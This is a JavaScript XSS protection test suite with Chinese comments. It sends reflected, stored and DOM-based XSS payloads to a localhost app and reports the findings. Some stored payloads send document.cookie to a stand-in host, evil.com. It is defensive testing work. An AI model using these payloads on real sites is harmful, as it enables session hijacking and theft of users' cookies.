/**
 * XSS攻击防护测试套件
 * 测试反射型、存储型和DOM型XSS攻击防护
 */

const axios = require('axios');
const puppeteer = require('puppeteer');

class XSSProtectionTest {
  constructor(baseURL = 'http://localhost:3000') {
    this.baseURL = baseURL;
    this.apiURL = 'http://localhost:3001/api';
    this.testResults = {
      reflectedXSS: [],
      storedXSS: [],
      domXSS: [],
      summary: {
        total: 0,
        passed: 0,
        failed: 0,
        critical: 0
      }
    };
  }

  /**
   * 反射型XSS测试载荷
   */
  getReflectedXSSPayloads() {
    return [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      '<select onfocus=alert("XSS") autofocus>',
      '<textarea onfocus=alert("XSS") autofocus>',
      '<keygen onfocus=alert("XSS") autofocus>',
      '<video><source onerror="alert(\'XSS\')">',
      '<audio src=x onerror=alert("XSS")>',
      '<details open ontoggle=alert("XSS")>',
      '<marquee onstart=alert("XSS")>',
      '"><script>alert("XSS")</script>',
      '\';alert("XSS");//',
      '";alert("XSS");//',
      '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',
      '<img src="javascript:alert(\'XSS\')">'
    ];
  }

  /**
   * 存储型XSS测试载荷
   */
  getStoredXSSPayloads() {
    return [
      '<script>document.cookie="xss=stored"</script>',
      '<img src=x onerror=document.location="http://evil.com/steal?cookie="+document.cookie>',
      '<svg onload=fetch("http://evil.com/log?data="+btoa(document.cookie))>',
      '<iframe src="data:text/html,<script>parent.postMessage(document.cookie,\'*\')</script>"></iframe>',
      '<object data="data:text/html,<script>alert(\'Stored XSS\')</script>"></object>',
      '<embed src="data:text/html,<script>alert(\'Stored XSS\')</script>">',
      '<link rel=stylesheet href="data:text/css,body{background:url(javascript:alert(\'XSS\'))}">',
      '<style>@import"data:text/css,body{background:url(javascript:alert(\'XSS\'))}"</style>',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
      '<form><button formaction="javascript:alert(\'XSS\')">Submit</button></form>'
    ];
  }

  /**
   * DOM型XSS测试载荷
   */
  getDOMXSSPayloads() {
    return [
      '#<script>alert("DOM XSS")</script>',
      '#<img src=x onerror=alert("DOM XSS")>',
      '#javascript:alert("DOM XSS")',
      '#"><script>alert("DOM XSS")</script>',
      '#\';alert("DOM XSS");//',
      '#";alert("DOM XSS");//',
      '#<svg onload=alert("DOM XSS")>',
      '#<iframe src="javascript:alert(\'DOM XSS\')"></iframe>',
      '#<body onload=alert("DOM XSS")>',
      '#<details open ontoggle=alert("DOM XSS")>'
    ];
  }

  /**
   * 测试反射型XSS
   */
  async testReflectedXSS() {
    console.log('🔍 开始反射型XSS测试...');
    const payloads = this.getReflectedXSSPayloads();
    
    // 测试搜索参数
    for (const payload of payloads) {
      try {
        const testCase = {
          type: 'Reflected XSS',
          payload: payload,
          target: 'Search Parameter',
          timestamp: new Date().toISOString()
        };

        // 测试GET参数
        const response = await axios.get(`${this.baseURL}/?search=${encodeURIComponent(payload)}`, {
          timeout: 5000,
          validateStatus: () => true
        });

        // 检查响应中是否包含未转义的载荷
        const isVulnerable = response.data.includes(payload) && 
                           !response.data.includes('&lt;') && 
                           !response.data.includes('&gt;');

        testCase.vulnerable = isVulnerable;
        testCase.statusCode = response.status;
        testCase.responseSize = response.data.length;
        
        if (isVulnerable) {
          testCase.severity = 'HIGH';
          testCase.description = '检测到反射型XSS漏洞：用户输入未经过滤直接输出到页面';
          this.testResults.summary.critical++;
        } else {
          testCase.severity = 'SAFE';
          testCase.description = '输入已正确转义或过滤';
        }

        this.testResults.reflectedXSS.push(testCase);
        this.testResults.summary.total++;
        
        if (isVulnerable) {
          this.testResults.summary.failed++;
        } else {
          this.testResults.summary.passed++;
        }

      } catch (error) {
        this.testResults.reflectedXSS.push({
          type: 'Reflected XSS',
          payload: payload,
          target: 'Search Parameter',
          vulnerable: false,
          error: error.message,
          severity: 'ERROR',
          timestamp: new Date().toISOString()
        });
        this.testResults.summary.total++;
      }
    }

    // 测试API端点
    await this.testAPIReflectedXSS();
  }

  /**
   * 测试API端点的反射型XSS
   */
  async testAPIReflectedXSS() {
    const payloads = this.getReflectedXSSPayloads().slice(0, 5); // 使用部分载荷
    const endpoints = [
      { path: '/auth/validate-invite', method: 'GET', param: 'inviteCode' },
      { path: '/user/profile', method: 'GET', param: 'userId' }
    ];

    for (const endpoint of endpoints) {
      for (const payload of payloads) {
        try {
          const testCase = {
            type: 'API Reflected XSS',
            payload: payload,
            target: `${endpoint.method} ${endpoint.path}`,
            timestamp: new Date().toISOString()
          };

          let response;
          if (endpoint.method === 'GET') {
            response = await axios.get(`${this.apiURL}${endpoint.path}/${encodeURIComponent(payload)}`, {
              timeout: 5000,
              validateStatus: () => true
            });
          }

          const responseText = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
          const isVulnerable = responseText.includes(payload) && 
                             !responseText.includes('&lt;') && 
                             !responseText.includes('&gt;');

          testCase.vulnerable = isVulnerable;
          testCase.statusCode = response.status;
          testCase.severity = isVulnerable ? 'HIGH' : 'SAFE';
          testCase.description = isVulnerable ? 
            'API端点存在反射型XSS漏洞' : 
            'API端点正确处理了恶意输入';

          this.testResults.reflectedXSS.push(testCase);
          this.testResults.summary.total++;
          
          if (isVulnerable) {
            this.testResults.summary.failed++;
            this.testResults.summary.critical++;
          } else {
            this.testResults.summary.passed++;
          }

        } catch (error) {
          this.testResults.reflectedXSS.push({
            type: 'API Reflected XSS',
            payload: payload,
            target: `${endpoint.method} ${endpoint.path}`,
            vulnerable: false,
            error: error.message,
            severity: 'ERROR',
            timestamp: new Date().toISOString()
          });
          this.testResults.summary.total++;
        }
      }
    }
  }

  /**
   * 测试存储型XSS
   */
  async testStoredXSS() {
    console.log('🔍 开始存储型XSS测试...');
    const payloads = this.getStoredXSSPayloads();
    
    for (const payload of payloads) {
      try {
        const testCase = {
          type: 'Stored XSS',
          payload: payload,
          target: 'User Registration',
          timestamp: new Date().toISOString()
        };

        // 尝试注册包含XSS载荷的用户
        const registerResponse = await axios.post(`${this.apiURL}/auth/register`, {
          email: `test${Date.now()}@example.com`,
          password: 'password123',
          username: payload, // 在用户名中注入载荷
          inviterCode: ''
        }, {
          timeout: 10000,
          validateStatus: () => true
        });

        testCase.registerStatus = registerResponse.status;
        testCase.registerResponse = registerResponse.data;

        // 检查注册是否成功且载荷是否被存储
        if (registerResponse.status === 201 || registerResponse.status === 200) {
          // 尝试获取用户信息，检查载荷是否被存储并可能执行
          const profileResponse = await axios.get(`${this.apiURL}/auth/profile`, {
            headers: {
              'Authorization': `Bearer ${registerResponse.data.data?.token || 'mock-token'}`
            },
            timeout: 5000,
            validateStatus: () => true
          });

          const responseText = JSON.stringify(profileResponse.data);
          const isVulnerable = responseText.includes(payload) && 
                             !responseText.includes('&lt;') && 
                             !responseText.includes('&gt;');

          testCase.vulnerable = isVulnerable;
          testCase.profileStatus = profileResponse.status;
          testCase.severity = isVulnerable ? 'CRITICAL' : 'SAFE';
          testCase.description = isVulnerable ? 
            '检测到存储型XSS漏洞：恶意脚本被存储并可能在其他用户访问时执行' : 
            '用户输入已正确转义或过滤';

          if (isVulnerable) {
            this.testResults.summary.critical++;
          }
        } else {
          testCase.vulnerable = false;
          testCase.severity = 'SAFE';
          testCase.description = '注册被拒绝，可能存在输入验证';
        }

        this.testResults.storedXSS.push(testCase);
        this.testResults.summary.total++;
        
        if (testCase.vulnerable) {
          this.testResults.summary.failed++;
        } else {
          this.testResults.summary.passed++;
        }

      } catch (error) {
        this.testResults.storedXSS.push({
          type: 'Stored XSS',
          payload: payload,
          target: 'User Registration',
          vulnerable: false,
          error: error.message,
          severity: 'ERROR',
          timestamp: new Date().toISOString()
        });
        this.testResults.summary.total++;
      }
    }
  }

  /**
   * 测试DOM型XSS
   */
  async testDOMXSS() {
    console.log('🔍 开始DOM型XSS测试...');
    const payloads = this.getDOMXSSPayloads();
    
    let browser;
    try {
      browser = await puppeteer.launch({ 
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
      });
      
      for (const payload of payloads) {
        const page = await browser.newPage();
        
        try {
          const testCase = {
            type: 'DOM XSS',
            payload: payload,
            target: 'URL Fragment',
            timestamp: new Date().toISOString()
          };

          // 设置控制台监听器来捕获alert
          let alertTriggered = false;
          page.on('dialog', async dialog => {
            alertTriggered = true;
            await dialog.dismiss();
          });

          // 访问包含载荷的URL
          await page.goto(`${this.baseURL}${payload}`, {
            waitUntil: 'networkidle0',
            timeout: 10000
          });

          // 等待一段时间让JavaScript执行
          await page.waitForTimeout(2000);

          // 检查页面内容
          const pageContent = await page.content();
          const hasUnescapedPayload = pageContent.includes(payload.substring(1)) && 
                                    !pageContent.includes('&lt;') && 
                                    !pageContent.includes('&gt;');

          testCase.vulnerable = alertTriggered || hasUnescapedPayload;
          testCase.alertTriggered = alertTriggered;
          testCase.hasUnescapedContent = hasUnescapedPayload;
          testCase.severity = testCase.vulnerable ? 'HIGH' : 'SAFE';
          testCase.description = testCase.vulnerable ? 
            'DOM型XSS漏洞：客户端JavaScript处理URL片段时未进行适当过滤' : 
            'URL片段处理安全';

          this.testResults.domXSS.push(testCase);
          this.testResults.summary.total++;
          
          if (testCase.vulnerable) {
            this.testResults.summary.failed++;
            this.testResults.summary.critical++;
          } else {
            this.testResults.summary.passed++;
          }

        } catch (error) {
          this.testResults.domXSS.push({
            type: 'DOM XSS',
            payload: payload,
            target: 'URL Fragment',
            vulnerable: false,
            error: error.message,
            severity: 'ERROR',
            timestamp: new Date().toISOString()
          });
          this.testResults.summary.total++;
        } finally {
          await page.close();
        }
      }
    } catch (error) {
      console.error('DOM XSS测试初始化失败:', error);
    } finally {
      if (browser) {
        await browser.close();
      }
    }
  }

  /**
   * 运行所有XSS测试
   */
  async runAllTests() {
    console.log('🚀 开始XSS防护测试...');
    const startTime = Date.now();

    await this.testReflectedXSS();
    await this.testStoredXSS();
    await this.testDOMXSS();

    const endTime = Date.now();
    const duration = endTime - startTime;

    // 计算测试结果统计
    this.testResults.summary.duration = duration;
    this.testResults.summary.passRate = this.testResults.summary.total > 0 ? 
      (this.testResults.summary.passed / this.testResults.summary.total * 100).toFixed(2) : 0;

    console.log('✅ XSS防护测试完成');
    console.log(`📊 测试统计: 总计${this.testResults.summary.total}个测试，通过${this.testResults.summary.passed}个，失败${this.testResults.summary.failed}个`);
    console.log(`⚠️  发现${this.testResults.summary.critical}个严重安全问题`);
    console.log(`⏱️  测试耗时: ${duration}ms`);

    return this.testResults;
  }

  /**
   * 生成测试报告
   */
  generateReport() {
    const report = {
      title: 'XSS攻击防护测试报告',
      timestamp: new Date().toISOString(),
      summary: this.testResults.summary,
      details: {
        reflectedXSS: this.testResults.reflectedXSS,
        storedXSS: this.testResults.storedXSS,
        domXSS: this.testResults.domXSS
      },
      recommendations: this.getSecurityRecommendations()
    };

    return report;
  }

  /**
   * 获取安全建议
   */
  getSecurityRecommendations() {
    const recommendations = [];

    if (this.testResults.summary.critical > 0) {
      recommendations.push({
        priority: 'HIGH',
        category: 'XSS防护',
        title: '实施输入验证和输出编码',
        description: '对所有用户输入进行严格验证，对输出到HTML的内容进行适当编码',
        actions: [
          '使用白名单验证用户输入',
          '对HTML输出进行实体编码',
          '使用Content Security Policy (CSP)',
          '避免使用innerHTML，改用textContent',
          '对JSON输出进行适当转义'
        ]
      });

      recommendations.push({
        priority: 'HIGH',
        category: 'DOM安全',
        title: '加强客户端安全处理',
        description: '确保客户端JavaScript安全处理URL参数和用户输入',
        actions: [
          '避免直接使用location.hash等URL参数',
          '使用安全的DOM操作方法',
          '实施客户端输入验证',
          '使用模板引擎的自动转义功能'
        ]
      });
    }

    recommendations.push({
      priority: 'MEDIUM',
      category: '安全头部',
      title: '配置安全HTTP头部',
      description: '通过HTTP头部提供额外的XSS防护',
      actions: [
        '设置X-XSS-Protection头部',
        '配置Content-Security-Policy',
        '使用X-Content-Type-Options: nosniff',
        '设置Referrer-Policy'
      ]
    });

    return recommendations;
  }
}

module.exports = XSSProtectionTest;

// 如果直接运行此文件
if (require.main === module) {
  const test = new XSSProtectionTest();
  test.runAllTests().then(results => {
    console.log('\n📋 测试报告:');
    console.log(JSON.stringify(test.generateReport(), null, 2));
  }).catch(error => {
    console.error('测试执行失败:', error);
  });
}